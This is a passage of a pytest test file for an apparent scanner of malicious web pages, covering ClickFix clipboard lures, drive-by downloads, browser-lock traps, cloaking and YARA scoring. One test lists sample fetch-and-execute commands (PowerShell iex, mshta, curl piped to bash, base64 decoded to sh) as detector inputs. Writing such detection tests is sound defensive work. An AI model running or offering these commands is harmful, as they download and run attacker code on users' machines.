    assert not any("JS location manipulation" in f for f in findings)
    assert result.malicious_score == pytest.approx(0.5 + 0.15)


@requires_browser
@pytest.mark.asyncio
async def test_js_redirect_loop_stops_at_max_hops(local_site, tmp_path):
    import time
    from pnakotic.src.scanner.artifacts import ArtifactManager
    from pnakotic.src.scanner.engine import PnakoticEngine

    async def only_loopback_literal(host):
        return host == "127.0.0.1"

    base, _hits = local_site
    engine = PnakoticEngine(task_id="local-job", timeout_ms=10000, max_hops=4,
                            host_allowed=only_loopback_literal)
    engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
    started = time.monotonic()
    result = await engine.scan(f"{base}/js-loop-a")
    assert time.monotonic() - started < 8  # stopped by max_hops, not by the 10 s page timeout
    assert result.metadata["redirect_loop"] is True
    assert len([h for h in result.hops if h.mechanism == "js_location"]) <= 4
    assert result.is_redirect_chain_detected is True


@requires_browser
@pytest.mark.asyncio
async def test_slow_subresource_does_not_skip_analysis(local_site, tmp_path):
    from pnakotic.src.scanner.artifacts import ArtifactManager
    from pnakotic.src.scanner.engine import PnakoticEngine

    async def only_loopback_literal(host):
        return host == "127.0.0.1"

    base, _hits = local_site
    engine = PnakoticEngine(task_id="local-job", timeout_ms=3000, host_allowed=only_loopback_literal)
    engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
    result = await engine.scan(f"{base}/never-idle")  # the <img> holds `load` open past the timeout
    assert result.metadata.get("raw_error") or result.metadata.get("settle_timed_out")
    assert any(h.mechanism == "js_obfuscation" for h in result.hops)
    assert list((tmp_path / "local-job" / "screenshots").glob("*.png"))


@requires_browser
@pytest.mark.asyncio
async def test_analyzer_exception_propagates(local_site, tmp_path):
    base, _hits = local_site
    engine = _local_engine(tmp_path)

    def boom(_html):
        raise RuntimeError("boom")

    engine.analyst.analyze_content = boom
    with pytest.raises(RuntimeError, match="boom"):
        await engine.scan(f"{base}/target")


# ---------- landing-page behavior (behavior.py) ----------

def _behaviors(result):
    from pnakotic.src.scanner.behavior import behavior_events
    return behavior_events(result.hops)


@requires_browser
@pytest.mark.asyncio
@pytest.mark.parametrize("path, via", [("/clickfix", "writeText"), ("/clickfix-exec", "execCommand")])
async def test_clipboard_command_is_decisive(local_site, tmp_path, path, via):
    base, _ = local_site
    result = await _local_engine(tmp_path).scan(f"{base}{path}")
    writes = [e for e in _behaviors(result) if e["id"] == "clipboard_write"]
    assert writes and writes[0]["via"] == via and writes[0]["command"] is True
    assert result.malicious_score == 1.0
    assert result.metadata["decisive_findings"][0].startswith("Decisive: page wrote a shell command")
    assert result.is_redirect_chain_detected is False  # behavior hops are not redirects


@requires_browser
@pytest.mark.asyncio
async def test_password_form_page_signals(local_site, tmp_path):
    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/pw")
    signals = result.metadata["page_signals"]
    assert signals["password_inputs"] == 1
    assert signals["forms"] == 1
    assert signals["title"] == "Sign in to PayPal"
    assert signals["content_type"] == "text/html"
    assert signals["error_page"] is False
    # 127.0.0.1 is not PayPal's
    assert any(f.startswith("Credential form impersonating paypal") for f in result.metadata["scoring_findings"])


@requires_browser
@pytest.mark.asyncio
async def test_clipboard_command_on_click_is_caught_by_the_click_probe(local_site, tmp_path):
    base, _ = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/clickfix-click")
    assert result.metadata["click_probe"] == "clicked"
    writes = [e for e in _behaviors(result) if e["id"] == "clipboard_write"]
    assert writes and writes[0]["trigger"] == "click" and writes[0]["command"] is True
    assert result.malicious_score == 1.0


@requires_browser
@pytest.mark.asyncio
async def test_drive_by_download_is_recorded_and_cancelled(local_site, tmp_path):
    base, _ = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/drive-by")
    downloads = [e for e in _behaviors(result) if e["id"] == "download"]
    assert downloads and downloads[0]["filename"] == "Update.exe" and downloads[0]["executable"] is True
    assert result.malicious_score == 1.0
    assert not list(tmp_path.rglob("Update.exe"))  # never kept


@requires_browser
@pytest.mark.asyncio
async def test_non_html_landing_is_not_analysed(local_site, tmp_path):
    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/audio")
    assert result.metadata["page_signals"]["content_type"] == "audio/mpeg"
    assert not [h for h in result.hops if h.mechanism == "static_analysis"]
    assert result.metadata["page_signals"]["title"] == ""
    assert "Landing document is not HTML: audio/mpeg" in result.metadata["scoring_findings"]


@requires_browser
@pytest.mark.asyncio
async def test_browser_lock_is_decisive_and_dialogs_dismissed(local_site, tmp_path):
    base, _ = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/browser-lock")
    ids = {e["id"] for e in _behaviors(result)}
    assert {"beforeunload_trap", "history_flood", "fullscreen_request", "dialog", "dialog_flood"} <= ids
    assert result.malicious_score == 1.0
    assert any("browser-lock pattern" in f for f in result.metadata["decisive_findings"])
    assert result.metadata.get("raw_error") is None  # the dialogs did not hang the page


@requires_browser
@pytest.mark.asyncio
async def test_redirect_to_unreachable_host_is_not_analysed(local_site, tmp_path):
    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/to-dead")
    assert len([h for h in result.hops if h.mechanism == "js_location"]) == 1
    assert result.metadata["navigation_failed"] == "http://no-such-host.invalid/x"
    assert result.final_url == "http://no-such-host.invalid/x"
    assert result.metadata["page_signals"]["error_page"] is True
    assert not [h for h in result.hops if h.url.startswith("chrome-error://")]
    assert not [h for h in result.hops if h.mechanism == "static_analysis"]
    # The egress policy only allows 127.0.0.1, so the guard refuses the destination; the
    # navigation fails (chrome-error://) either way.
    assert "no-such-host.invalid" in (result.metadata.get("blocked_hosts") or [])
    assert "Navigation failed: no-such-host.invalid unreachable" in result.metadata["scoring_findings"]
    assert list((tmp_path / "local-job" / "screenshots").glob("*.png"))


@requires_browser
@pytest.mark.asyncio
async def test_plain_page_has_no_behaviors(local_site, tmp_path):
    base, _ = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/target")
    assert _behaviors(result) == []
    assert result.metadata["decisive_findings"] == []


@requires_browser
@pytest.mark.asyncio
async def test_hooks_are_not_visible_to_the_page(local_site):
    from playwright.async_api import async_playwright
    from pnakotic.src.scanner.behavior import BehaviorRecorder

    base, _ = local_site
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        try:
            ctx = await browser.new_context()
            await BehaviorRecorder().attach(ctx)
            page = await ctx.new_page()
            await page.goto(f"{base}/hook-probe")
            leaked, write_text, to_string = (await page.title()).split("|")
        finally:
            await browser.close()
    assert leaked == "0"  # the binding was removed from window
    assert "[native code]" in write_text and "[native code]" in to_string


def test_behavior_recorder_bounds_page_input():
    from pnakotic.src.scanner.behavior import MAX_EVENTS, MAX_PER_ID, MAX_TEXT, BehaviorRecorder

    rec = BehaviorRecorder()
    rec._on_page_event({}, {"id": "not_a_behavior"})
    rec._on_page_event({}, "not a dict")
    assert rec.events == []
    for _ in range(MAX_PER_ID + 5):
        rec._on_page_event({}, {"id": "clipboard_write", "text": "x" * (MAX_TEXT * 3)})
    assert len(rec.events) == MAX_PER_ID
    assert len(rec.events[0]["text"]) == MAX_TEXT
    for event_id in ("fullscreen_request", "keyboard_lock", "notification_request", "beforeunload_trap",
                     "history_flood") * MAX_PER_ID:
        rec._on_page_event({}, {"id": event_id})
    assert len(rec.events) <= MAX_EVENTS


def test_clipboard_command_patterns():
    from pnakotic.src.scanner.behavior import is_command, is_executable

    for text in ("powershell -w h -c iex(iwr x)", "cmd /c start x", "mshta https://x/y",
                 "curl -s https://x/i | bash", "echo aGk= | base64 -d | sh", "conhost --headless pwsh"):
        assert is_command(text), text
    for text in ("", "hello world", "https://example.com/page", "Ctrl+V to paste your code: 123456"):
        assert not is_command(text), text
    assert is_executable("Update.EXE") and is_executable("setup.msi") and is_executable("x.apk")
    assert not is_executable("report.pdf") and not is_executable("noext")


def _behavior_hop(**event):
    import json
    from pnakotic.src.scanner.models import RedirectHop
    return RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence=json.dumps(event))


def test_scoring_behavior_support_weights():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    result.hops = [
        _behavior_hop(id="clipboard_write", text="hello", command=False),
        _behavior_hop(id="clipboard_write", text="again", command=False),  # counted once
        _behavior_hop(id="notification_request"),
        _behavior_hop(id="fullscreen_request"),  # one lock behavior: supporting, not decisive
    ]
    score = PnakoticScorer().score(result)
    assert score == pytest.approx(0.15 + 0.2 + 0.15)
    assert result.metadata["decisive_findings"] == []


def test_scoring_lone_beforeunload_is_not_weighted():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    result.hops = [_behavior_hop(id="beforeunload_trap", via="addEventListener")]
    assert PnakoticScorer().score(result) == 0.0 and result.metadata["scoring_findings"] == []
    result.hops.append(_behavior_hop(id="history_flood", calls=10))  # with a second lock behavior: decisive
    assert PnakoticScorer().score(result) == 1.0


def test_scoring_decisive_overrides_weights():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    result.hops = [_behavior_hop(id="download", filename="invoice.zip", executable=False)]
    assert PnakoticScorer().score(result) == pytest.approx(0.4)  # archive: supporting only

    result.hops.append(_behavior_hop(id="download", filename="Setup.msi", executable=True))
    assert PnakoticScorer().score(result) == 1.0
    assert result.metadata["scoring_findings"][0].startswith("Decisive: download of Setup.msi")


def test_scoring_ignores_malformed_behavior_evidence():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    result.hops = [RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence="not json"),
                   RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence="[1, 2]")]
    assert PnakoticScorer().score(result) == 0.0


# ---------- cross-profile comparison (cloaking) ----------

def _two_site_engine(tmp_path):
    """Like _local_engine, but `localhost` is a second allowed site (a different apex)."""
    engine = _local_engine(tmp_path)

    async def two_sites(host):
        return host in ("127.0.0.1", "localhost")

    engine.host_allowed = two_sites
    return engine


@requires_browser
@pytest.mark.asyncio
async def test_every_profile_loads_and_cloaking_is_recorded(local_site, tmp_path):
    # Local pages land on the IP 127.0.0.1, which scores ip_landing (0.5) everywhere, so the
    # verdict rules are tested offline below; this checks the mechanics end to end.
    base, _ = local_site
    result = await _two_site_engine(tmp_path).scan(f"{base}/cloak", "default", compare=True)
    cloaking = result.metadata["cloaking"]
    from pnakotic.src.scanner.profiles import PROFILES

    assert cloaking["landings"] == {name: ("localhost" if name == "mobile-ios" else "127.0.0.1") for name in PROFILES}
    assert cloaking["common"] == "127.0.0.1" and cloaking["steered"] == ["mobile-ios"]
    ios = next(v for v in result.metadata["variants"] if v["profile"] == "mobile-ios")
    assert ios["final_url"].endswith("/scam") and ios["raw_error"] is None and ios["redirects"] == 1
    assert any(f.startswith("[mobile-ios] ClickFix lure text") for f in result.metadata["scoring_findings"])
    # the job's own chain is still the requested (desktop) profile's
    assert result.is_redirect_chain_detected is False
    shots = [a["rel_path"] for a in result.metadata["artifact_manifest"]["artifacts"]]
    assert sum(r.startswith("screenshots/") for r in shots) == 1  # the dashboard's landing shot
    assert {r.split("/")[1] for r in shots if r.startswith("profiles/")} == set(PROFILES) - {"default"}


@requires_browser
@pytest.mark.asyncio
async def test_without_compare_only_the_requested_profile_runs(local_site, tmp_path):
    base, hits = local_site
    before = len(hits)
    result = await _two_site_engine(tmp_path).scan(f"{base}/cloak", "mobile-ios")
    assert "variants" not in result.metadata and "cloaking" not in result.metadata
    assert result.final_url.endswith("/scam")
    assert [h for h in hits[before:] if h[1] == "/cloak"] == [("127.0.0.1", "/cloak")]


def _landed(url, **metadata):
    from pnakotic.src.scanner.models import ScanResult
    r = ScanResult(target_url="https://ads.example/c", final_url=url)
    r.metadata.update(metadata)
    return r


def _scored_profiles(*results):
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    for r in results:
        PnakoticScorer().score(r)
    return results


def test_cloaking_onto_a_suspicious_page_is_decisive():
    from pnakotic.src.intelligence.scorer import PnakoticScorer

    desktop, ios, android = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://win-alert.xyz/"),
                                    _landed("https://www.shop.example/"))
    assert ios.malicious_score == pytest.approx(0.3)  # suspicious TLD only: not suspicious enough alone
    ios.hops = [_behavior_hop(id="notification_request")]
    PnakoticScorer().score(ios)
    assert ios.malicious_score >= 0.4
    assert PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android}) == 1.0
    assert desktop.metadata["cloaking"]["steered"] == ["mobile-ios"]
    assert desktop.metadata["decisive_findings"][0].startswith("Decisive: cloaking")


def test_cloaking_with_a_bot_fallback_is_decisive():
    # most profiles get the scam; the bot-like desktop is sent to google.com
    from pnakotic.src.intelligence.scorer import PnakoticScorer

    desktop, ios, android = _scored_profiles(_landed("https://www.google.com/"), _landed("https://10.20.30.40/"),
                                    _landed("https://10.20.30.40/"))
    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android})
    assert desktop.metadata["cloaking"]["common"] == "10.20.30.40"
    assert desktop.metadata["cloaking"]["suspicious"] == ["mobile-android", "mobile-ios"]
    assert desktop.malicious_score == 1.0


def test_harmless_profile_split_is_supporting_only():
    from pnakotic.src.intelligence.scorer import PnakoticScorer

    desktop, ios = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://apps.apple.com/app/shop"))
    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
    assert desktop.metadata["decisive_findings"] == []
    assert desktop.malicious_score == pytest.approx(0.35)
    assert desktop.metadata["scoring_findings"][0].startswith("Cloaking: landing depends on the browser profile")


def test_same_landing_everywhere_is_not_cloaking():
    from pnakotic.src.intelligence.scorer import PnakoticScorer

    desktop, ios = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://m.shop.example/"))
    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
    assert desktop.metadata["cloaking"] is None and desktop.malicious_score == 0.0


def test_combine_takes_the_worst_profile_and_prefixes_its_findings():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    scorer = PnakoticScorer()
    primary = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    scorer.score(primary)
    ios = ScanResult(target_url="https://x.example/", final_url="https://x.example/a")
    ios.hops = [_behavior_hop(id="download", filename="Setup.exe", executable=True)]
    scorer.score(ios)
    assert scorer.combine(primary, "default", {"mobile-ios": ios, "mobile-android": "net::ERR_FAILED"}) == 1.0
    assert primary.metadata["cloaking"] is None  # same apex: not cloaking, but the payload still counts
    assert primary.metadata["decisive_findings"] == ["[mobile-ios] Decisive: download of Setup.exe started without a click"]
    variants = primary.metadata["variants"]
    assert variants[0]["profile"] == "default" and variants[0]["requested"] is True
    assert variants[0]["malicious_score"] == 0.0  # its own score, not the job's
    assert variants[2] == {"profile": "mobile-android", "error": "net::ERR_FAILED"}


def test_combine_ignores_profiles_whose_page_never_loaded():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    scorer = PnakoticScorer()
    primary = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    scorer.score(primary)
    failed = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    failed.metadata["raw_error"] = "net::ERR_CONNECTION_RESET"
    other = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    for r in (failed, other):
        scorer.score(r)
    scorer.combine(primary, "default", {"mobile-ios": failed, "mobile-android": other})
    assert primary.metadata["cloaking"] is None


# ---------- YARA over the page, its frames and its scripts (yara_scan.py) ----------
# Synthetic rules only: the real rule sets are private and live outside this repository.

def _yara_available() -> bool:
    try:
        import yara  # noqa: F401
        return True
    except ImportError:
        return False


requires_yara = pytest.mark.skipif(not _yara_available(), reason="yara-python not installed")

_RULE = """rule {name} : {tag} {{
  meta:
    signatureId = {sid}
    production = {production}
    severity = {severity}
    description = "{description}"
    targetLanguage = "raw"
  strings:
    $a = "{marker}"
  condition:
    $a and filename != "ignore-me"
}}
"""


def _rules_dir(tmp_path):
    """A rules tree split by target: html/ and raw/js_* are used, raw/php_* and php/ are not."""
    root = tmp_path / "YARA"
    for sub in ("html", "raw", "php"):
        (root / sub).mkdir(parents=True)

    def rule(path, name, marker, severity, production=True):
        tag = "production" if production else "exploratory"
        path.write_text(_RULE.format(name=name, tag=tag, sid=42000000 + len(name), severity=severity,
                                     production=str(production).lower(), marker=marker,
                                     description=f"Synthetic {name}"))

    rule(root / "raw" / "js_skimmer_test_001.yara", "js_skimmer_test_001", "PNAKOTIC_TEST_SKIMMER", 5)
    rule(root / "html" / "html_adframe_test_001.yara", "html_adframe_test_001", "PNAKOTIC_TEST_ADFRAME", 4,
         production=False)
    rule(root / "raw" / "php_ignored_test_001.yara", "php_ignored_test_001", "shop", 5)
    rule(root / "php" / "php_backdoor_test_001.yara", "php_backdoor_test_001", "news", 5)
    (root / "raw" / "js_broken_test_001.yara").write_text("rule js_broken_test_001 { condition: nope(")
    return root


@pytest.fixture
def yara_rules_dir(tmp_path, monkeypatch):
    root = _rules_dir(tmp_path)
    monkeypatch.setenv("YARA_RULES_DIR", str(root))
    return root


@requires_yara
def test_yara_rule_selection_and_broken_files(yara_rules_dir):
    from pnakotic.src.scanner.yara_scan import _rule_files, load_rules

    names = sorted(pathlib_name(f) for f in _rule_files(str(yara_rules_dir)))
    assert names == ["html_adframe_test_001.yara", "js_broken_test_001.yara", "js_skimmer_test_001.yara"]
    rules = load_rules()
    assert rules.count == 2 and len(rules.skipped) == 1 and rules.skipped[0].startswith("js_broken_test_001")
    assert load_rules() is rules  # compiled once per process


def pathlib_name(path):
    import os
    return os.path.basename(path)


def test_yara_is_off_without_rules_dir(monkeypatch, tmp_path):
    from pnakotic.src.scanner.yara_scan import load_rules

    monkeypatch.delenv("YARA_RULES_DIR", raising=False)
    assert load_rules() is None
    monkeypatch.setenv("YARA_RULES_DIR", str(tmp_path / "missing"))
    assert load_rules() is None


@requires_yara
@pytest.mark.asyncio
async def test_yara_bounds_and_dedupes(yara_rules_dir, monkeypatch):
    from pnakotic.src.scanner import yara_scan

    rules = yara_scan.load_rules()
    marker = b"PNAKOTIC_TEST_SKIMMER"
    buffers = [("script", f"http://x.example/{i}.js", marker) for i in range(3)]
    buffers.append(("script", "http://x.example/big.js", b"x" * (yara_scan.MAX_BUFFER_BYTES + 10) + marker))
    found, stats = await yara_scan.scan_buffers(rules, buffers)
    assert len(found) == 1 and found[0]["hits"] == 3  # the marker past the size cap is not seen
    assert found[0]["url"] == "http://x.example/0.js" and found[0]["snippet"] == "PNAKOTIC_TEST_SKIMMER"
    assert stats["buffers"] == 4 and stats["bytes"] <= 3 * len(marker) + yara_scan.MAX_BUFFER_BYTES
    monkeypatch.setattr(yara_scan, "SCAN_BUDGET_S", -1.0)
    _, stats = await yara_scan.scan_buffers(rules, buffers)
    assert stats["budget_exhausted"] is True and stats["buffers"] == 0


@requires_yara
@pytest.mark.asyncio
async def test_yara_per_buffer_keeps_each_buffer_with_context(yara_rules_dir):
    from pnakotic.src.scanner.yara_scan import load_rules, scan_buffers
    rules = load_rules()
    bufs = [("served", "https://s/", b"<p>PNAKOTIC_TEST_SKIMMER</p>"),
            ("script", "https://s/a.js", b"x\nPNAKOTIC_TEST_SKIMMER")]
    per, _ = await scan_buffers(rules, bufs, per_buffer=True)
    assert sorted((f["source"], f["buffer_index"]) for f in per) == [("script", 1), ("served", 0)]
    js = next(f for f in per if f["source"] == "script")
    assert js["context"]["line"] == 2 and js["offset"] == 2
    folded, _ = await scan_buffers(rules, bufs)
    assert len(folded) == 1 and folded[0]["hits"] == 2 and "context" not in folded[0]


@requires_yara
@pytest.mark.asyncio
async def test_yara_filename_external_gets_an_extension(tmp_path, monkeypatch):
    from pnakotic.src.scanner import yara_scan

    (tmp_path / "r").mkdir()
    (tmp_path / "r" / "js_ext_test_001.yara").write_text(
        'rule js_ext_test_001 { strings: $a = "MARK" condition: $a and filename matches /\\.js$/ }')
    monkeypatch.setenv("YARA_RULES_DIR", str(tmp_path / "r"))
    rules = yara_scan.load_rules()
    found, _ = await yara_scan.scan_buffers(rules, [("script", "https://cdn.example/t/collect?v=1#x", b"MARK")])
    assert [f["rule"] for f in found] == ["js_ext_test_001"]  # extensionless URL still named *.js


@requires_browser
@requires_yara
@pytest.mark.asyncio
async def test_yara_matches_a_loaded_script(local_site, tmp_path, yara_rules_dir):
    base, _ = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/injected")
    hits = [json.loads(h.evidence) for h in result.hops if h.mechanism == "yara_match"]
    assert [(h["rule"], h["source"]) for h in hits] == [("js_skimmer_test_001", "script")]
    assert hits[0]["url"].endswith("/evil.js") and hits[0]["production"] is True and hits[0]["severity"] == 5
    assert result.malicious_score == 1.0
    assert result.metadata["decisive_findings"][0].startswith("Decisive: known malicious code, YARA js_skimmer_test_001")
    assert result.metadata["yara"]["rules"] == 2 and result.metadata["yara"]["buffers"] >= 2


@requires_browser
@requires_yara
@pytest.mark.asyncio
async def test_yara_matches_an_ad_frame_without_deciding(local_site, tmp_path, yara_rules_dir):
    base, _ = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/with-frame")
    hits = [json.loads(h.evidence) for h in result.hops if h.mechanism == "yara_match"]
    assert [(h["rule"], h["source"]) for h in hits] == [("html_adframe_test_001", "frame")]
    assert result.metadata["decisive_findings"] == []  # exploratory: strong support, never decisive
    assert any(f.startswith("YARA html_adframe_test_001 (exploratory, severity 4)") for f in result.metadata["scoring_findings"])


def test_scoring_yara_tiers():
    import json as _json
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    def hit(rule, severity, production):
        return RedirectHop(url="https://x.example/a.js", mechanism="yara_match", evidence=_json.dumps(
            {"id": "yara_match", "rule": rule, "severity": severity, "production": production,
             "source": "script", "url": "https://x.example/a.js", "description": "d"}))

    def score(*hops):
        r = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
        r.hops = list(hops)
        return PnakoticScorer().score(r), r

    assert score(hit("a", 2, True), hit("b", 1, False))[0] == pytest.approx(0.15)  # weak, once
    assert score(hit("a", 5, False), hit("b", 3, True))[0] == pytest.approx(0.4)   # strong, once
    assert score(hit("a", 5, False), hit("b", 2, False))[0] == pytest.approx(0.55)
    total, r = score(hit("a", 4, True))
    assert total == 1.0 and r.metadata["decisive_findings"][0].startswith("Decisive: known malicious code, YARA a")


@requires_browser
@pytest.mark.asyncio
async def test_self_reload_is_not_a_redirect(local_site, tmp_path):
    import json

    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/self")
    nav_hops = [h for h in result.hops if h.mechanism == "client_navigation"]
    assert len(nav_hops) == 1
    evidence = json.loads(nav_hops[0].evidence)
    assert evidence["reason"] == "scriptInitiated"
    assert evidence["self"] is True
    assert not [h for h in result.hops if h.mechanism == "js_location"]
    assert result.is_redirect_chain_detected is False
    assert result.final_url == f"{base}/self"


def test_notification_prompt_after_the_click_probe_is_not_weighted():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    def score(trigger):
        r = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
        r.hops = [_behavior_hop(id="notification_request", trigger=trigger)]
        return PnakoticScorer().score(r), r.metadata["scoring_findings"]

    assert score("load")[0] == pytest.approx(0.2)
    total, findings = score("click")
    assert total == 0.0 and any("not weighted" in f for f in findings)
